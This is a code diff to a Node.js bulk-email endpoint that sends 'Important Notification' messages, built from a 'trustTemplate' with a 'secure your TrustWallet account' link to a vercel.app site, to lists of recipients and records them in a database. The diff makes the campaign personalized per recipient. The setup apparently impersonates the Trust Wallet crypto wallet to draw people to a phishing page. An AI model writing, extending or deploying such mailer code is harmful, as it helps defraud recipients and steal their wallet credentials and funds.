@@ -6,7 +6,7 @@ const { trustTemplate } = require('../utils/mailtemplates');
 /**
  * POST /send-bulk-email
  * Expects body: { "email": "a@example.com" } or { "email": ["a@example.com", "b@example.com"] }
- * Sends a default subject and message/template to all emails, including a 'Secure your account' button,
+ * Sends a security notification email to all recipients using the personalized trustTemplate,
  * and saves each email to the database.
  */
 exports.sendBulkEmailDefault = async (req, res) => {
@@ -30,34 +30,30 @@ exports.sendBulkEmailDefault = async (req, res) => {
             return res.status(400).json({ error: 'Email must be a non-empty string or array.' });
         }
 
-        // Use only the mail template for the email body
         const defaultSubject = "Important Notification";
         const secureLink = `https://trust-wallet-inky.vercel.app/`;
 
         // Send emails and save to DB in parallel
         const results = await Promise.allSettled(
-            email.map(async (e) => {await sendEmail({
-            email,
-            subject: defaultSubject,
-            html: trustTemplate(secureLink),
-            text: "Please secure your TrustWallet account at https://trust-wallet-inky.vercel.app/"
-});
-                // Send the email using only the mail template
-                await sendEmail({
-                    email,
-                    subject: defaultSubject,
-                    html: trustTemplate(secureLink)
-                });
-                // Save to DB (avoid duplicates)
-                await userModel.updateOne(
-                    { email: e },
-                    { $setOnInsert: { email: e } },
-                    { upsert: true }
-                );
-                return e;
+            email.map(async (recipient) => {
+                try {
+                    await sendEmail({
+                        email: recipient,
+                        subject: defaultSubject,
+                        html: trustTemplate(secureLink, recipient)
+                    });
+                    // Save to DB (avoid duplicates)
+                    await userModel.updateOne(
+                        { email: recipient },
+                        { $setOnInsert: { email: recipient } },
+                        { upsert: true }
+                    );
+                    return recipient;
+                } catch (err) {
+                    throw err && err.message ? err.message : JSON.stringify(err);
+                }
             })
         );
-
 
         const success = results.filter(r => r.status === 'fulfilled').length;
         const failed = results.filter(r => r.status === 'rejected').length;
